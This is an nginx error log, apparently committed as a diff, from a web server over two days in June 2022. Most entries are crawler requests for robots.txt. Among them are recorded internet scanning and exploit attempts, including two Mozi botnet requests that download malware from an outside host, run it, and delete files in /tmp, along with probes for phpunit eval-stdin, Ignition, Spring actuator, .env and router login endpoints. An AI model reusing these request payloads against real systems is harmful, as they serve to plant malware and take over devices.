+2022/06/02 07:06:40 [error] 23#23: *730 open() "/usr/share/nginx/html/paihangbang/wp-content/themes/twentytwentytwo/screenshot.png" failed (2: No such file or directory), client: 112.60.20.58, server: localhost, request: "GET /paihangbang/wp-content/themes/twentytwentytwo/screenshot.png?ver=1.2 HTTP/1.1", host: "159.75.219.167"
+2022/06/02 07:12:30 [error] 23#23: *736 open() "/usr/share/nginx/html/shell" failed (2: No such file or directory), client: 61.145.167.178, server: localhost, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+http://61.145.167.178:52668/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1", host: "159.75.219.167:80"
+2022/06/02 07:16:34 [error] 23#23: *737 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 81.71.60.224, server: localhost, request: "GET /paihangbang/wp-admin/options.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/wp-admin/options-general.php"
+2022/06/02 07:17:55 [error] 23#23: *739 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 81.71.60.219, server: localhost, request: "GET /paihangbang/wp-admin/options-writing.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/wp-admin/options-general.php"
+2022/06/02 07:21:46 [error] 23#23: *741 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 81.71.60.217, server: localhost, request: "GET /paihangbang/wp-admin/upload.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/wp-admin/edit.php?post_type=page"
+2022/06/02 07:34:15 [error] 23#23: *745 open() "/usr/share/nginx/html/sitemap.xml" failed (2: No such file or directory), client: 47.242.185.210, server: localhost, request: "GET /sitemap.xml HTTP/1.1", host: "s7980.dlapp.lansors.com"
+2022/06/02 07:34:15 [error] 23#23: *746 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 47.242.185.210, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "s7980.dlapp.lansors.com"
+2022/06/02 08:03:25 [error] 23#23: *751 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.64, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.cvv6vc.dgphb.com"
+2022/06/02 08:06:39 [error] 23#23: *754 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.202, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.21738.dgphb.com"
+2022/06/02 08:10:02 [error] 23#23: *763 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.202, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.4407.dgphb.com"
+2022/06/02 08:16:20 [error] 23#23: *766 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.3, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "72802.dgphb.com"
+2022/06/02 08:36:21 [error] 23#23: *771 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.51, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.21689.dgphb.com"
+2022/06/02 08:53:16 [error] 23#23: *774 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.247, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.5384.dgphb.com"
+2022/06/02 08:56:33 [error] 23#23: *777 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.235, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.9852.dgphb.com"
+2022/06/02 08:59:51 [error] 23#23: *782 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.3, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "225.dgphb.com"
+2022/06/02 09:03:08 [error] 23#23: *785 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.40, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.84266.dgphb.com"
+2022/06/02 09:06:26 [error] 23#23: *788 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.18, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.20236.dgphb.com"
+2022/06/02 09:09:44 [error] 23#23: *793 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.4, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "4532.dgphb.com"
+2022/06/02 09:11:53 [error] 23#23: *796 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 193.106.191.48, server: localhost, request: "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167:80"
+2022/06/02 09:13:01 [error] 23#23: *798 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.17, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.5574.dgphb.com"
+2022/06/02 09:16:19 [error] 23#23: *801 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.24, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.194019.dgphb.com"
+2022/06/02 09:19:37 [error] 23#23: *804 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.37, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.27222.dgphb.com"
+2022/06/02 09:22:54 [error] 23#23: *807 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.145, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.27758.dgphb.com"
+2022/06/02 09:26:11 [error] 23#23: *814 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.3, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.91832.dgphb.com"
+2022/06/02 09:29:29 [error] 23#23: *817 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.90, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.64504.dgphb.com"
+2022/06/02 09:32:47 [error] 23#23: *820 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.7, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.515.dgphb.com"
+2022/06/02 09:33:28 [error] 23#23: *823 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 193.106.191.48, server: localhost, request: "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167:80"
+2022/06/02 09:36:04 [error] 23#23: *827 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.84, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "2847.dgphb.com"
+2022/06/02 09:39:22 [error] 23#23: *830 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.47, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.3900.dgphb.com"
+2022/06/02 09:42:39 [error] 23#23: *833 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.92, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.19474.dgphb.com"
+2022/06/02 09:45:57 [error] 23#23: *842 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.38, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.44050.dgphb.com"
+2022/06/02 09:47:22 [error] 23#23: *849 open() "/usr/share/nginx/html/shell" failed (2: No such file or directory), client: 103.217.123.52, server: localhost, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+http://103.217.123.52:46064/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1", host: "159.75.219.167:80"
+2022/06/02 09:47:49 [error] 23#23: *850 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 185.196.220.81, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "159.75.219.167:80", referrer: "http://159.75.219.167:80/admin/login.asp"
+2022/06/02 09:49:15 [error] 23#23: *851 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.25, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.161237.dgphb.com"
+2022/06/02 09:52:33 [error] 23#23: *854 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.175, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.670.dgphb.com"
+2022/06/02 09:55:50 [error] 23#23: *857 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.30, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "vecy.dgphb.com"
+2022/06/02 09:59:09 [error] 23#23: *862 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.23, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.7944.dgphb.com"
+2022/06/02 10:01:10 [error] 23#23: *869 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.71, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "5169.dgphb.com"
+2022/06/02 10:01:10 [error] 23#23: *870 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.8, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.35793.dgphb.com"
+2022/06/02 10:01:11 [error] 23#23: *873 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.48, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.4504.dgphb.com"
+2022/06/02 10:06:19 [error] 23#23: *878 open() "/usr/share/nginx/html/editBlackAndWhiteList" failed (2: No such file or directory), client: 74.88.88.191, server: localhost, request: "POST /editBlackAndWhiteList HTTP/1.1", host: "159.75.219.167:82"
+2022/06/02 10:06:19 [error] 23#23: *879 open() "/usr/share/nginx/html/editBlackAndWhiteList" failed (2: No such file or directory), client: 74.88.88.191, server: localhost, request: "POST /editBlackAndWhiteList HTTP/1.1", host: "159.75.219.167:82"
+2022/06/02 10:12:48 [error] 23#23: *888 open() "/usr/share/nginx/html/solr/admin/info/system" failed (2: No such file or directory), client: 193.106.191.48, server: localhost, request: "GET /solr/admin/info/system?wt=json HTTP/1.1", host: "159.75.219.167:80"
+2022/06/02 10:46:10 [error] 23#23: *897 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.9, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "274037.dgphb.com"
+2022/06/02 11:36:27 [error] 23#23: *918 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 185.196.220.81, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "159.75.219.167:80", referrer: "http://159.75.219.167:80/admin/login.asp"
+2022/06/02 12:32:21 [error] 23#23: *942 "/usr/share/nginx/html/console/index.php" is not found (2: No such file or directory), client: 193.106.191.48, server: localhost, request: "GET /console/ HTTP/1.1", host: "159.75.219.167:80"
+2022/06/02 12:53:53 [error] 23#23: *957 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 183.136.225.14, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "159.75.219.167:80"
+2022/06/02 12:54:29 [error] 23#23: *958 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 183.136.225.14, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "159.75.219.167:80"
+2022/06/02 13:25:43 [error] 23#23: *966 "/usr/share/nginx/html/console/index.php" is not found (2: No such file or directory), client: 81.71.60.221, server: localhost, request: "GET /console/ HTTP/1.1", host: "159.75.219.167:80"
+2022/06/02 13:32:09 [error] 23#23: *967 open() "/usr/share/nginx/html/Autodiscover/Autodiscover.xml" failed (2: No such file or directory), client: 193.106.191.48, server: localhost, request: "POST /Autodiscover/Autodiscover.xml HTTP/1.1", host: "159.75.219.167:80"
+2022/06/02 13:40:47 [error] 23#23: *970 open() "/usr/share/nginx/html/text4041654148447" failed (2: No such file or directory), client: 8.142.184.59, server: localhost, request: "GET /text4041654148447 HTTP/1.1", host: "159.75.219.167"
+2022/06/02 13:40:47 [error] 23#23: *973 open() "/usr/share/nginx/html/HNAP1" failed (2: No such file or directory), client: 8.142.184.59, server: localhost, request: "GET /HNAP1 HTTP/1.1", host: "159.75.219.167"
+2022/06/02 13:40:47 [error] 23#23: *976 open() "/usr/share/nginx/html/sdk" failed (2: No such file or directory), client: 8.142.184.59, server: localhost, request: "POST /sdk HTTP/1.1", host: "159.75.219.167"
+2022/06/02 13:40:47 [error] 23#23: *977 open() "/usr/share/nginx/html/evox/about" failed (2: No such file or directory), client: 8.142.184.59, server: localhost, request: "GET /evox/about HTTP/1.1", host: "159.75.219.167"
+2022/06/02 13:40:58 [error] 23#23: *983 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 8.142.184.59, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "159.75.219.167"
+2022/06/02 13:40:59 [error] 23#23: *984 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 8.142.184.59, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "159.75.219.167"
+2022/06/02 13:54:32 [error] 23#23: *985 open() "/usr/share/nginx/html/_ignition/execute-solution" failed (2: No such file or directory), client: 193.106.191.48, server: localhost, request: "GET /_ignition/execute-solution HTTP/1.1", host: "159.75.219.167:80"
+2022/06/02 13:54:37 [error] 23#23: *986 open() "/usr/share/nginx/html/solr/admin/info/system" failed (2: No such file or directory), client: 81.71.60.220, server: localhost, request: "GET /solr/admin/info/system?wt=json HTTP/1.1", host: "159.75.219.167:80"
+2022/06/02 14:00:52 [error] 23#23: *989 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 2.56.57.72, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "159.75.219.167:80", referrer: "http://159.75.219.167:80/admin/login.asp"
+2022/06/02 14:10:29 [error] 23#23: *1011 "/usr/share/nginx/html/english/index.php" is not found (2: No such file or directory), client: 61.131.202.222, server: localhost, request: "GET http://www.rfa.org/english/ HTTP/1.1", host: "www.rfa.org"
+2022/06/02 14:17:37 [error] 23#23: *1016 open() "/usr/share/nginx/html/editBlackAndWhiteList" failed (2: No such file or directory), client: 222.136.23.232, server: localhost, request: "POST /editBlackAndWhiteList HTTP/1.1", host: "167.219.75.159:85"
+2022/06/02 14:40:44 [error] 23#23: *1024 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.88, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.cv6kky.dgphb.com"
+2022/06/02 15:12:24 [error] 23#23: *1040 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.154, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "99885.dgphb.com"
+2022/06/02 15:23:39 [error] 23#23: *1043 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.112, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.47558.dgphb.com"
+2022/06/02 15:27:32 [error] 23#23: *1046 open() "/usr/share/nginx/html/evox/about" failed (2: No such file or directory), client: 81.71.60.226, server: localhost, request: "GET /evox/about HTTP/1.1", host: "159.75.219.167"
+2022/06/02 15:34:54 [error] 23#23: *1057 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.49, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.26742.dgphb.com"
+2022/06/02 15:46:09 [error] 23#23: *1066 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.110, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "81572.dgphb.com"
+2022/06/02 15:57:14 [error] 23#23: *1071 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.116, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.71808.dgphb.com"
+2022/06/02 15:59:01 [error] 23#23: *1078 open() "/usr/share/nginx/html/_ignition/execute-solution" failed (2: No such file or directory), client: 81.71.60.212, server: localhost, request: "GET /_ignition/execute-solution HTTP/1.1", host: "159.75.219.167:80"
+2022/06/02 16:03:38 [error] 23#23: *1079 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.55, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.177189.dgphb.com"
+2022/06/02 16:05:14 [error] 23#23: *1082 open() "/usr/share/nginx/html/actuator/gateway/routes" failed (2: No such file or directory), client: 193.106.191.48, server: localhost, request: "GET /actuator/gateway/routes HTTP/1.1", host: "159.75.219.167:80"
+2022/06/02 16:10:04 [error] 23#23: *1083 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.4, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "84266.dgphb.com"
+2022/06/02 16:16:30 [error] 23#23: *1086 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.55, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.749.dgphb.com"
+2022/06/02 16:22:55 [error] 23#23: *1089 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.241, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.36129.dgphb.com"
+2022/06/02 16:29:21 [error] 23#23: *1092 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.15, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.2279.dgphb.com"
+2022/06/02 16:34:06 [error] 23#23: *1095 open() "/usr/share/nginx/html/text4041654148447" failed (2: No such file or directory), client: 112.53.2.68, server: localhost, request: "GET /text4041654148447 HTTP/1.1", host: "159.75.219.167"
+2022/06/02 16:35:47 [error] 23#23: *1096 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.89, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.21945.dgphb.com"
+2022/06/02 16:42:13 [error] 23#23: *1100 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.242, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.89082.dgphb.com"
+2022/06/02 16:48:38 [error] 23#23: *1105 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.46, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.114677.dgphb.com"
+2022/06/02 16:55:04 [error] 23#23: *1108 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.106, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.4199.dgphb.com"
+2022/06/02 17:01:29 [error] 23#23: *1111 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.202, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.60391.dgphb.com"
+2022/06/02 17:07:55 [error] 23#23: *1122 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.27, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.54721.dgphb.com"
+2022/06/02 17:14:21 [error] 23#23: *1129 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.187, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.1883.dgphb.com"
+2022/06/02 17:20:47 [error] 23#23: *1133 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.123, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.638.dgphb.com"
+2022/06/02 17:27:12 [error] 23#23: *1138 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.79, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.69585.dgphb.com"
+2022/06/02 17:33:38 [error] 23#23: *1141 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.24, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.83923.dgphb.com"
+2022/06/02 17:40:04 [error] 23#23: *1144 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.37, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.8570.dgphb.com"
+2022/06/02 17:45:03 [error] 23#23: *1147 open() "/usr/share/nginx/html/HNAP1" failed (2: No such file or directory), client: 81.71.60.213, server: localhost, request: "GET /HNAP1 HTTP/1.1", host: "159.75.219.167"
+2022/06/02 17:46:05 [error] 23#23: *1148 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.163, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.89573.dgphb.com"
+2022/06/02 17:46:05 [error] 23#23: *1149 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.113, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.6181.dgphb.com"
+2022/06/02 17:46:07 [error] 23#23: *1154 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.36, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "5407.dgphb.com"
+2022/06/02 17:46:07 [error] 23#23: *1155 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.153, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.7480.dgphb.com"
+2022/06/02 17:55:55 [error] 23#23: *1164 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 71.6.199.23, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "159.75.219.167"
+2022/06/02 17:55:56 [error] 23#23: *1165 open() "/usr/share/nginx/html/sitemap.xml" failed (2: No such file or directory), client: 71.6.199.23, server: localhost, request: "GET /sitemap.xml HTTP/1.1", host: "159.75.219.167"
+2022/06/02 17:55:58 [error] 23#23: *1166 open() "/usr/share/nginx/html/.well-known/security.txt" failed (2: No such file or directory), client: 71.6.199.23, server: localhost, request: "GET /.well-known/security.txt HTTP/1.1", host: "159.75.219.167"
+2022/06/02 17:55:59 [error] 23#23: *1167 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 71.6.199.23, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "159.75.219.167"
+2022/06/02 18:31:05 [error] 23#23: *1173 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.182, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.8493.dgphb.com"
+2022/06/02 18:31:05 [error] 23#23: *1174 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.146, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.55206.dgphb.com"
+2022/06/02 19:36:15 [error] 23#23: *1190 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 17.121.115.178, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "www.dgphb.com"
+2022/06/02 20:26:19 [error] 23#23: *1211 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 45.83.67.1, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "159.75.219.167"
+2022/06/02 20:28:52 [error] 23#23: *1222 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 103.213.96.233, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "159.75.219.167"
+2022/06/03 00:07:17 [error] 23#23: *1244 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.67, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.35213.dgphb.com"
+2022/06/03 00:37:18 [error] 23#23: *1252 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.1, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.515.dgphb.com"
+2022/06/03 01:07:17 [error] 23#23: *1259 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.251, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.5384.dgphb.com"
+2022/06/03 01:37:16 [error] 23#23: *1264 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.200, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "36358.dgphb.com"
+2022/06/03 01:57:47 [error] 23#23: *1269 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.156, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "28898.dgphb.com"
+2022/06/03 02:07:17 [error] 23#23: *1276 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.7, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.91832.dgphb.com"
+2022/06/03 02:20:16 [error] 23#23: *1283 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.158, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.2175.dgphb.com"
+2022/06/03 02:42:46 [error] 23#23: *1286 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.119, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.638.dgphb.com"
+2022/06/03 03:05:16 [error] 23#23: *1291 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.237, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.36129.dgphb.com"
+2022/06/03 03:13:46 [error] 23#23: *1298 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.18, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.83211.dgphb.com"
+2022/06/03 03:13:46 [error] 23#23: *1301 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.123, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.c6c6i.dgphb.com"
+2022/06/03 03:27:46 [error] 23#23: *1306 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.114, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.47558.dgphb.com"
+2022/06/03 03:41:35 [error] 23#23: *1313 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 124.222.194.125, server: localhost, request: "GET /phpmyadmin/index.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167"
+2022/06/03 03:41:35 [error] 23#23: *1313 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 124.222.194.125, server: localhost, request: "GET /pmd/index.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167"
+2022/06/03 03:41:36 [error] 23#23: *1313 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 124.222.194.125, server: localhost, request: "GET /pmd/index.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167"
+2022/06/03 03:50:16 [error] 23#23: *1317 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.185, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.225948.dgphb.com"
+2022/06/03 03:58:46 [error] 23#23: *1320 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.97, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "10900.dgphb.com"
+2022/06/03 04:12:46 [error] 23#23: *1329 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.50, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "1024.dgphb.com"
+2022/06/03 04:25:43 [error] 23#23: *1332 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 114.119.147.137, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.2226.dgphb.com"
+2022/06/03 04:43:06 [error] 23#23: *1333 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 81.71.60.217, server: localhost, request: "GET /pmd/index.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167"
+2022/06/03 05:17:10 [error] 23#23: *1339 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 109.237.103.9, server: localhost, request: "GET /.env HTTP/1.1", host: "159.75.219.167"
+2022/06/03 06:16:48 [error] 23#23: *1347 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.220, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.33836.dgphb.com"
+2022/06/03 06:24:02 [error] 23#23: *1350 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 193.106.191.48, server: localhost, request: "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167:80"
+2022/06/03 06:26:25 [error] 23#23: *1352 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.55, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.749.dgphb.com"
+2022/06/03 06:36:01 [error] 23#23: *1357 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.64, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.19079.dgphb.com"
+2022/06/03 06:45:38 [error] 23#23: *1360 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.55, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.177189.dgphb.com"
+2022/06/03 06:55:14 [error] 23#23: *1363 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.61, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.6478.dgphb.com"
